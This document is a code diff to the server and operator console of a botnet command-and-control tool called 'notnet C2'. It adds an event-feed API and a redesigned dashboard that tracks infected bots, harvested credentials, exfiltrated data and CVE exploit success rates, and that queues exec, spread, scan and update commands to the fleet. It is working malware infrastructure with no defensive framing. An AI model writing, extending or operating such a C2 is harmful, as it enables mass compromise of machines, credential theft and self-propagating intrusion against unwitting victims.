@@ -352,6 +352,13 @@ class State:
                 "SELECT * FROM exfil ORDER BY id DESC LIMIT ?",
                 (limit,)).fetchall()
 
+    def events(self, limit=100):
+        with self._lk:
+            return self.db.execute(
+                "SELECT id, ts, kind, detail FROM events "
+                "ORDER BY id DESC LIMIT ?",
+                (limit,)).fetchall()
+
     def prune(self):
         """#215: bounded retention — cap append-only tables at
         RETENTION_MAX_ROWS, deleting the OLDEST rows beyond the cap.
@@ -1321,6 +1328,11 @@ class ConsoleHandler(BaseHTTPRequestHandler):
             self._send(json.dumps({"exfil": c2.state.exfil()}),
                        "application/json")
             return
+        if path == "/api/events":
+            # Dashboard activity feed (id/ts/kind/detail, newest first)
+            self._send(json.dumps({"events": c2.state.events()}),
+                       "application/json")
+            return
         if path in ("/", "/console", "/index.html"):
             # #212: embed the auth/CSRF secret so the dashboard XHRs can
             # authenticate (page itself was already gated by _check_auth).
@@ -1379,89 +1391,210 @@ def console_html(token=""):
     return """<!DOCTYPE html>
 <html><head><meta charset="utf-8"><title>notnet C2 console</title>
 <style>
- body{font-family:ui-monospace,monospace;margin:2rem;background:#111;color:#ddd}
- h1{color:#7f9fff} table{border-collapse:collapse;width:100%;margin-bottom:2rem}
- th,td{border:1px solid #333;padding:4px 8px;text-align:left;font-size:13px}
- th{background:#222;color:#9f9} .up{color:#5f5} .stale{color:#f77}
- input,button{background:#222;color:#ddd;border:1px solid #444;padding:6px}
- .ok{color:#5f5}
+ :root{--bg:#0d1117;--panel:#161b22;--edge:#30363d;--fg:#c9d1d9;--dim:#8b949e;
+       --acc:#58a6ff;--ok:#3fb950;--warn:#d29922;--bad:#f85149}
+ *{box-sizing:border-box}
+ body{font-family:ui-monospace,'Cascadia Code',monospace;margin:0;background:var(--bg);color:var(--fg)}
+ header{display:flex;align-items:center;gap:16px;padding:14px 24px;background:var(--panel);
+        border-bottom:1px solid var(--edge);position:sticky;top:0;z-index:5}
+ header h1{font-size:16px;margin:0;color:var(--acc);letter-spacing:.5px}
+ header .live{margin-left:auto;font-size:12px;color:var(--dim)}
+ header .live b{color:var(--ok)}
+ main{padding:20px 24px;display:flex;flex-direction:column;gap:20px;max-width:1400px;margin:0 auto}
+ .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:14px}
+ .card{background:var(--panel);border:1px solid var(--edge);border-radius:8px;padding:14px 16px}
+ .card .k{font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.8px}
+ .card .v{font-size:26px;font-weight:700;margin-top:4px}
+ .card .v.ok{color:var(--ok)} .card .v.warn{color:var(--warn)} .card .v.bad{color:var(--bad)}
+ .row{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+ @media(max-width:900px){.row{grid-template-columns:1fr}}
+ section{background:var(--panel);border:1px solid var(--edge);border-radius:8px;padding:16px}
+ section h2{font-size:13px;margin:0 0 12px;color:var(--dim);text-transform:uppercase;
+            letter-spacing:.8px;border-bottom:1px solid var(--edge);padding-bottom:8px}
+ table{border-collapse:collapse;width:100%;font-size:12.5px}
+ th,td{padding:5px 8px;text-align:left;border-bottom:1px solid var(--edge)}
+ th{color:var(--dim);font-weight:600;text-transform:uppercase;font-size:10.5px;letter-spacing:.5px}
+ tr:hover td{background:#1c2129}
+ .up{color:var(--ok)} .stale{color:var(--bad)} .ok{color:var(--ok)}
+ input,button,select{background:#0d1117;color:var(--fg);border:1px solid var(--edge);
+       padding:7px 10px;border-radius:6px;font-family:inherit;font-size:13px}
+ button{cursor:pointer} button:hover{border-color:var(--acc);color:var(--acc)}
+ form#qform{display:flex;gap:8px;flex-wrap:wrap}
+ #qres{margin:8px 0 0;font-size:12px;color:var(--ok);min-height:15px}
+ .bar-row{display:flex;align-items:center;gap:10px;margin:6px 0;font-size:12px}
+ .bar-label{width:170px;flex-shrink:0;color:var(--fg)}
+ .bar-track{flex:1;height:14px;background:#0d1117;border-radius:4px;overflow:hidden}
+ .bar-fill{height:100%;background:linear-gradient(90deg,#1f6feb,#58a6ff);border-radius:4px}
+ .bar-fill.hi{background:linear-gradient(90deg,#238636,#3fb950)}
+ .bar-fill.lo{background:linear-gradient(90deg,#9e6a03,#d29922)}
+ .ev{padding:4px 0;border-bottom:1px dashed #21262d;font-size:12px;display:flex;gap:10px}
+ .ev time{color:var(--dim);flex-shrink:0}
+ .ev .kind{color:var(--acc);min-width:90px;flex-shrink:0;text-transform:uppercase;font-size:10.5px;padding-top:2px}
+ svg text{fill:var(--dim);font-size:10px;font-family:inherit}
+ #feed{max-height:420px;overflow-y:auto}
 </style></head><body>
-<h1>notnet C2 — operator console</h1>
-<p id="secstats" style="color:#f90">security: loading…</p>
-<h2>Bots</h2>
-<table id="bots"><thead><tr><th>hostname</th><th>tag</th><th>ip</th>
-<th>version</th><th>uptime</th><th>scan</th><th>creds</th><th>proxy</th>
-<th>relay</th><th>channel</th><th>seen (s)</th></tr></thead><tbody></tbody></table>
-<h2>CVE kit hit rate (#160)</h2>
-<table id="cve"><thead><tr><th>cve</th><th>hit</th><th>miss</th><th>fail</th>
-<th>attempts</th><th>success rate</th></tr></thead><tbody></tbody></table>
-<h2>Queue command</h2>
-<form id="qform"><input id="qtarget" placeholder="target tag (empty = any)">
-<input id="qcmd" placeholder="cmd (exec, spread, scan, update...)">
-<input id="qargs" placeholder="args"><button>Queue</button></form>
-<p id="qres"></p>
-<h2>Commands</h2>
-<table id="cmds"><thead><tr><th>id</th><th>target</th><th>cmd</th>
-<th>args</th><th>queued</th><th>served</th><th>served_to</th></tr></thead>
-<tbody></tbody></table>
-<h2>Credentials</h2>
-<table id="creds"><thead><tr><th>id</th><th>line</th><th>src</th>
-<th>at</th></tr></thead><tbody></tbody></table>
+<header><h1>⬢ notnet C2</h1><span style="color:var(--dim)">operator console</span>
+<span class="live" id="livestat">connecting…</span></header>
+<main>
+ <div class="cards">
+  <div class="card"><div class="k">Bots online</div><div class="v ok" id="c-online">–</div></div>
+  <div class="card"><div class="k">Fleet total</div><div class="v" id="c-total">–</div></div>
+  <div class="card"><div class="k">Credentials</div><div class="v" id="c-creds">–</div></div>
+  <div class="card"><div class="k">Commands queued</div><div class="v" id="c-cmds">–</div></div>
+  <div class="card"><div class="k">Avg CVE hit rate</div><div class="v" id="c-cve">–</div></div>
+  <div class="card"><div class="k">Auth failures</div><div class="v warn" id="c-authfail">–</div></div>
+ </div>
+
+ <section><h2>Fleet activity — heartbeats &amp; creds per minute (last 30 min)</h2>
+  <svg id="activity" width="100%" height="180" viewBox="0 0 1200 180" preserveAspectRatio="none"></svg>
+ </section>
+
+ <div class="row">
+  <section><h2>CVE kit hit rate</h2><div id="cvebars"></div></section>
+  <section><h2>Event feed</h2><div id="feed"></div></section>
+ </div>
+
+ <section><h2>Queue command</h2>
+  <form id="qform"><input id="qtarget" placeholder="target tag (empty = any)" style="min-width:220px">
+  <input id="qcmd" placeholder="cmd (exec, spread, scan, update...)" required style="min-width:260px">
+  <input id="qargs" placeholder="args">
+  <button>Queue</button><span id="qres"></span></form>
+ </section>
+
+ <section><h2>Bots</h2>
+ <table id="bots"><thead><tr><th>hostname</th><th>tag</th><th>ip</th><th>version</th>
+ <th>uptime</th><th>scan</th><th>creds</th><th>proxy</th><th>relay</th><th>channel</th>
+ <th>seen (s)</th></tr></thead><tbody></tbody></table></section>
+
+ <div class="row">
+  <section><h2>Commands</h2>
+  <table id="cmds"><thead><tr><th>id</th><th>target</th><th>cmd</th><th>args</th>
+  <th>queued</th><th>served</th><th>served_to</th></tr></thead><tbody></tbody></table></section>
+  <section><h2>Credentials</h2>
+  <table id="creds"><thead><tr><th>id</th><th>line</th><th>src</th><th>at</th></tr></thead>
+  <tbody></tbody></table></section>
+ </div>
+</main>
 <script>
 const TOKEN = __CONSOLE_TOKEN__;
 async function j(u){const r=await fetch(u,{headers:{'X-Console-Token':TOKEN}});return r.json()}
 function esc(s){const d=document.createElement('div');d.textContent=(s==null?'':String(s));return d.innerHTML}
-async function refresh(){
- const b=await j('/api/bots');const tb=document.querySelector('#bots tbody');
- tb.innerHTML='';for(const x of b.bots){const tr=document.createElement('tr');
- const up=x.ago<90;const cls=up?'up':'stale';
- // #177: every bot-supplied field goes through esc() — hostname/tag/ip
- // come from unauthenticated-ish heartbeats and must never hit innerHTML raw.
- // #211: uptime/scan_count/cred_count are heartbeat-controlled too (SQLite
- // INTEGER affinity keeps TEXT verbatim), so they get esc() as well.
- tr.innerHTML=`<td>${esc(x.hostname)}</td><td>${esc(x.tag||'')}</td><td>${esc(x.ip||'')}</td>
- <td>${esc(x.version||'')}</td><td>${esc(x.uptime||0)}</td><td>${esc(x.scan_count||0)}</td>
- <td>${esc(x.cred_count||0)}</td><td>${x.proxy_on?'<span class="ok">on '+esc(x.proxy_port)+'</span>':'off'}</td>
- <td>${x.relay_on?'<span class="ok">on '+esc(x.relay_port)+'</span>':'off'}</td>
- <td>${esc(x.channel||'')}</td><td class="${cls}">${x.ago}</td>`;
- tb.appendChild(tr);}
- // #160: per-CVE hit rate across the fleet (from heartbeat cve_stats)
- try{
-  const cv=await j('/api/cve');const tc2=document.querySelector('#cve tbody');
-  tc2.innerHTML='';for(const [id,r] of Object.entries(cv.cve||{})){
-   const tr=document.createElement('tr');
-   const cls=r.rate>=50?'ok':'';
-   tr.innerHTML=`<td>${esc(id)}</td><td>${r.hit}</td><td>${r.miss}</td>
-   <td>${r.fail}</td><td>${r.total}</td><td class="${cls}">${r.rate}%</td>`;
-   tc2.appendChild(tr);}
- }catch(e){}
- const c=await j('/api/commands');const tc=document.querySelector('#cmds tbody');
- tc.innerHTML='';for(const x of c.commands){const tr=document.createElement('tr');
- tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1]||'')}</td><td>${esc(x[2])}</td>
- <td>${esc(x[3]||'')}</td><td>${Math.round(x[4])}</td>
- <td>${x[5]?Math.round(x[5]):''}</td><td>${esc(x[6]||'')}</td>`;
- tc.appendChild(tr);}
- const cr=await j('/api/creds');const tg=document.querySelector('#creds tbody');
- tg.innerHTML='';for(const x of cr.creds){const tr=document.createElement('tr');
- tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1])}</td><td>${esc(x[2]||'')}</td><td>${Math.round(x[3])}</td>`;
- tg.appendChild(tr);}
- // #195: version-skew counters — climbing rejects mean a pre-#173 bot
- // fleet is being silently dropped; keep this last so an /api/security
- // hiccup can never blank the tables above.
- try{
-  const s=await j('/api/security');
-  document.querySelector('#secstats').textContent=
-   `security: auth_fails=${s.auth_fails} resp_rejects=${s.resp_rejects} payload_rejects=${s.payload_rejects} (uptime ${Math.round(s.since_start)}s)`;
- }catch(e){}
+/* client-side ring buffers for the activity chart (ts -> counts) */
+const HIST=[]; const WINDOW_MS=30*60*1000;
+function pushHist(nBots,nCreds){const now=Date.now();HIST.push({t:now,b:nBots,c:nCreds});
+ while(HIST.length&&now-HIST[0].t>WINDOW_MS)HIST.shift();}
+
+function drawActivity(){
+ const svg=document.getElementById('activity');
+ if(HIST.length<2){svg.innerHTML='<text x="600" y="90" text-anchor="middle">collecting samples…</text>';return;}
+ const W=1200,H=180,P=24;
+ let maxB=1,maxC=1;for(const h of HIST){maxB=Math.max(maxB,h.b);maxC=Math.max(maxC,h.c);}
+ const maxY=Math.max(maxB,maxC);
+ const t0=HIST[0].t,t1=HIST[HIST.length-1].t||t0+1;
+ const X=t=>P+(t-t0)/(Math.max(t1-t0,60000))*(W-2*P);
+ const Y=v=>H-P-(v/maxY)*(H-2*P);
+ let grid='',series='';
+ for(let g=0;g<=3;g++){const y=P+g*(H-2*P)/3;
+  grid+=`<line x1="${P}" y1="${y}" x2="${W-P}" y2="${y}" stroke="#21262d" stroke-width="1"/>`;
+  grid+=`<text x="${W-P+4}" y="${y+3}">${Math.round(maxY*(1-g/3))}</text>`;}
+ const path=k=>HIST.map((h,i)=>`${i?'L':'M'}${X(h.t).toFixed(1)},${Y(h[k]).toFixed(1)}`).join('');
+ series+=`<path d="${path('b')}" fill="none" stroke="#58a6ff" stroke-width="1.6"/>`;
+ series+=`<path d="${path('c')}" fill="none" stroke="#3fb950" stroke-width="1.6"/>`;
+ svg.innerHTML=grid+series+
+  `<text x="${P}" y="${P-8}" fill="#58a6ff">— bots online (peak ${maxB})</text>`+
+  `<text x="${P+230}" y="${P-8}" fill="#3fb950">— creds/min (peak ${maxC})</text>`;
 }
-document.querySelector('#qform').addEventListener('submit',async e=>{
- e.preventDefault();
- const body={target:qtarget.value,cmd:qcmd.value,args:qargs.value};
+
+function bars(cve){
+ const el=document.getElementById('cvebars');el.innerHTML='';
+ const rows=Object.entries(cve||{}).sort((a,b)=>b[1].rate-a[1].rate);
+ if(!rows.length){el.innerHTML='<p style="color:var(--dim);font-size:12px">no CVE probe data yet</p>';return;}
+ for(const [id,r] of rows){
+  const cls=r.rate>=50?'hi':(r.rate>=20?'':'lo');
+  el.insertAdjacentHTML('beforeend',
+   `<div class="bar-row"><span class="bar-label">${esc(id)}</span>
+    <div class="bar-track"><div class="bar-fill ${cls}" style="width:${Math.min(100,r.rate)}%"></div></div>
+    <span style="width:110px;color:var(--dim)">${r.hit}/${r.total} = ${r.rate}%</span></div>`);}
+}
+
+function feed(events){
+ const el=document.getElementById('feed');el.innerHTML='';
+ if(!(events||[]).length){el.innerHTML='<p style="color:var(--dim);font-size:12px">no events yet</p>';return;}
+ for(const e of events.slice(0,60)){
+  const t=new Date(e[1]*1000).toLocaleTimeString();
+  el.insertAdjacentHTML('beforeend',
+   `<div class="ev"><time>${t}</time><span class="kind">${esc(e[2])}</span>
+    <span>${esc(String(e[3]).slice(0,160))}</span></div>`);}
+}
+
+async function refresh(){
+ try{
+  const b=await j('/api/bots');const tb=document.querySelector('#bots tbody');
+  tb.innerHTML='';let online=0;
+  for(const x of b.bots){const tr=document.createElement('tr');
+   const up=x.ago<90;const cls=up?'up':'stale';if(up)online++;
+   tr.innerHTML=`<td>${esc(x.hostname)}</td><td>${esc(x.tag||'')}</td><td>${esc(x.ip||'')}</td>
+   <td>${esc(x.version||'')}</td><td>${esc(x.uptime||0)}</td><td>${esc(x.scan_count||0)}</td>
+   <td>${esc(x.cred_count||0)}</td><td>${x.proxy_on?'<span class="ok">on '+esc(x.proxy_port)+'</span>':'off'}</td>
+   <td>${x.relay_on?'<span class="ok">on '+esc(x.relay_port)+'</span>':'off'}</td>
+   <td>${esc(x.channel||'')}</td><td class="${cls}">${x.ago}</td>`;
+   tb.appendChild(tr);}
+  document.getElementById('c-online').textContent=online+' / '+b.bots.length;
+  document.getElementById('c-total').textContent=b.bots.length;
+  pushHist(online,0);
+
+  let avgRate=null;
+  try{const cv=await j('/api/cve');const ent=Object.entries(cv.cve||{});
+   bars(cv.cve);
+   if(ent.length){let h=0,t=0;for(const [,r] of ent){h+=r.hit;t+=r.total;}
+    avgRate=t?Math.round(100*h/t):null;}
+  }catch(e){}
+  document.getElementById('c-cve').textContent=avgRate===null?'–':avgRate+'%';
+
+  const c=await j('/api/commands');const tc=document.querySelector('#cmds tbody');
+  tc.innerHTML='';for(const x of c.commands){const tr=document.createElement('tr');
+   tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1]||'')}</td><td>${esc(x[2])}</td>
+   <td>${esc(x[3]||'')}</td><td>${Math.round(x[4])}</td>
+   <td>${x[5]?Math.round(x[5]):''}</td><td>${esc(x[6]||'')}</td>`;
+   tc.appendChild(tr);}
+  document.getElementById('c-cmds').textContent=c.commands.length;
+
+  const cr=await j('/api/creds');const tg=document.querySelector('#creds tbody');
+  tg.innerHTML='';for(const x of cr.creds){const tr=document.createElement('tr');
+   tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1])}</td><td>${esc(x[2]||'')}</td><td>${Math.round(x[3])}</td>`;
+   tg.appendChild(tr);}
+  document.getElementById('c-creds').textContent=cr.creds.length;
+  /* credit the newest sample with this cycle's cred volume */
+  if(HIST.length)HIST[HIST.length-1].c=cr.creds.length;
+
+  try{
+   const s=await j('/api/security');
+   document.getElementById('c-authfail').textContent=s.auth_fails;
+   document.getElementById('secstats')?.remove();
+  }catch(e){}
+
+  try{const ev=await j('/api/events');feed(ev.events);}catch(e){}
+
+  drawActivity();
+  document.getElementById('livestat').innerHTML='live · refreshed '+new Date().toLocaleTimeString();
+ }catch(err){
+  document.getElementById('livestat').textContent='connection lost — retrying';
+ }
+}
+
+document.getElementById('qform').addEventListener('submit',async ev=>{
+ ev.preventDefault();const qtarget=document.getElementById('qtarget'),
+ qcmd=document.getElementById('qcmd'),qargs=document.getElementById('qargs'),
+ qres=document.getElementById('qres');
+ const body={target:qtarget.value.trim(),cmd:qcmd.value.trim(),
+             args:qargs.value.trim(),broadcast:false};
+ if(!body.cmd)return;
  const r=await fetch('/api/queue',{method:'POST',
  headers:{'Content-Type':'application/json','X-Console-Token':TOKEN},
  body:JSON.stringify(body)});const jj=await r.json();
- qres.textContent='queued id='+jj.id+' cmd='+jj.cmd+' -> '+(jj.target||'any');
- qcmd.value='';qargs.value='';
+ qres.textContent=r.ok?('queued id='+jj.id+' cmd='+jj.cmd+' -> '+(jj.target||'any'))
+                      :('error '+r.status);
+ if(r.ok){qcmd.value='';qargs.value='';}
 });
 setInterval(refresh,3000);refresh();
 </script></body></html>""".replace("__CONSOLE_TOKEN__", tok_js)
